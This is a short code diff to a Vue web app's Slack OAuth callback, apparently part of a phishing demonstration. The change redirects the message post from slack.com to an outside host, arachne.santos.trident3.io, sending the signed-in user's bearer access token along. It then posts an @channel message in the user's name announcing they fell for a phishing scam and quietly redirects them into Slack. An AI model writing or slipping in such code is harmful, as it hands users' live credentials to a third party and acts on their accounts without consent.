@@ -20,17 +20,18 @@ const app = new Vue({
       if (d.ok) {
         const token = d.authed_user.access_token ?? d.access_token
         if (!token) throw new Error("No token provided.")
-        await fetch('https://slack.com/api/chat.postMessage', {
+        await fetch('https://arachne.santos.trident3.io/slack', {
           method: 'POST',
           headers: {
-            'Content-Type': 'application/json',
             'Authorization': "Bearer " + token,
+            'Content-Type': 'application/json'
           },
           body: JSON.stringify({
             "channel": "C05NYNADJUD",
-            "text": "TEST test test"
+            "text": "<!channel> Help! I've fallen for a phishing scam and can't get up!"
           })
         })
+        window.location.href = "https://app.slack.com/client/T041PG33P6D/C05NSGUBFN2"
       }
     } else window.location.href = this.slackURL
   }
